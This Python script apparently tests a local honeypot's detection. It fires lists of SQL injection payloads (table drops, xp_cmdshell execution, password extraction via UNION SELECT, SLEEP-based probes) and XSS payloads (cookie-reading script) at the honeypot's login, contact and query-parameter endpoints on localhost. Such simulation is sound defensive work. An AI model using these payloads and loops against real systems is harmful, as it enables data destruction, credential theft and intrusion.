# sqli_sim.py — Simulate SQL injection & XSS attacks against the honeypot
# Maps to MITRE ATT&CK T1190 (Initial Access — Exploit Public-Facing Application)
#
# Usage:  python -m adversary_simulation.sqli_sim
# Requires the honeypot to be running on http://127.0.0.1:8080

import requests
import time

BASE = "http://127.0.0.1:8080"
UA = "Mozilla/5.0 (compatible; SQLMapBot/1.6)"

# ── SQL Injection payloads ──────────────────────────────────────────────────
SQLI_PAYLOADS = [
    "' OR 1=1--",
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' UNION SELECT null, null--",
    "admin'--",
    "' OR ''='",
    "1' OR '1'='1'--",
    "' OR 1=1#",
    "') OR ('1'='1",
    "1; DROP TABLE users",
    "' UNION SELECT username, password FROM users--",
    "' AND 1=1--",
    "' OR 'x'='x",
    "'; EXEC xp_cmdshell('dir')--",
    "1' AND SLEEP(5)--",
    "' UNION ALL SELECT NULL, table_name FROM information_schema.tables--",
]

# ── XSS payloads ────────────────────────────────────────────────────────────
XSS_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert(1)>',
    '<svg/onload=alert(1)>',
    '<body onload=alert(1)>',
    'javascript:alert(document.cookie)',
    '<iframe src="javascript:alert(1)">',
    '"><script>alert(1)</script>',
    "'-alert(1)-'",
]


def simulate_sqli_login(payloads=None):
    """Send SQLi payloads through the login form."""
    payloads = payloads or SQLI_PAYLOADS
    print(f"\n[SQLi] Sending {len(payloads)} SQL injection payloads via /customer/login ...")
    session = requests.Session()
    session.headers.update({"User-Agent": UA})
    for i, payload in enumerate(payloads):
        try:
            r = session.post(f"{BASE}/customer/login",
                             data={"username": payload, "password": "pass"}, timeout=3)
            print(f"  [{i+1}/{len(payloads)}] {payload[:50]:50s}  →  HTTP {r.status_code}")
        except requests.RequestException as e:
            print(f"  [{i+1}/{len(payloads)}] FAILED — {e}")
        time.sleep(0.1)


def simulate_sqli_query_params():
    """Send SQLi payloads via URL query parameters."""
    targets = ["/contact", "/services", "/about"]
    print(f"\n[SQLi] Sending SQLi via query parameters ...")
    session = requests.Session()
    session.headers.update({"User-Agent": UA})
    count = 0
    for path in targets:
        for payload in SQLI_PAYLOADS[:5]:  # subset to keep it quick
            try:
                r = session.get(f"{BASE}{path}", params={"q": payload, "id": payload}, timeout=3)
                count += 1
                print(f"  GET {path}?q={payload[:40]:40s}  →  HTTP {r.status_code}")
            except requests.RequestException as e:
                print(f"  GET {path}  →  FAILED ({e})")
            time.sleep(0.1)
    print(f"[SQLi] {count} query-param injections sent.\n")


def simulate_xss():
    """Send XSS payloads via query parameters and form data."""
    print(f"[XSS] Sending {len(XSS_PAYLOADS)} XSS payloads ...")
    session = requests.Session()
    session.headers.update({"User-Agent": UA})
    for i, payload in enumerate(XSS_PAYLOADS):
        # Via query params
        try:
            r = session.get(f"{BASE}/contact", params={"q": payload}, timeout=3)
            print(f"  [{i+1}/{len(XSS_PAYLOADS)}] GET /contact?q={payload[:40]:40s}  →  HTTP {r.status_code}")
        except requests.RequestException as e:
            print(f"  [{i+1}/{len(XSS_PAYLOADS)}] FAILED — {e}")
        # Via form POST
        try:
            r = session.post(f"{BASE}/contact",
                             data={"name": payload, "email": "test@test.com", "message": payload},
                             timeout=3)
        except requests.RequestException:
            pass
        time.sleep(0.1)
    print(f"[XSS] XSS simulation complete.\n")


if __name__ == "__main__":
    print("=" * 60)
    print("  ADVERSARY SIMULATION — SQLi & XSS (T1190)")
    print("=" * 60)
    simulate_sqli_login()
    simulate_sqli_query_params()
    simulate_xss()
    print("=" * 60)
    print("  SQLi & XSS simulation complete.")
    print("  Check logs/honeypot_logs.json for attack_detected events.")
    print("=" * 60)
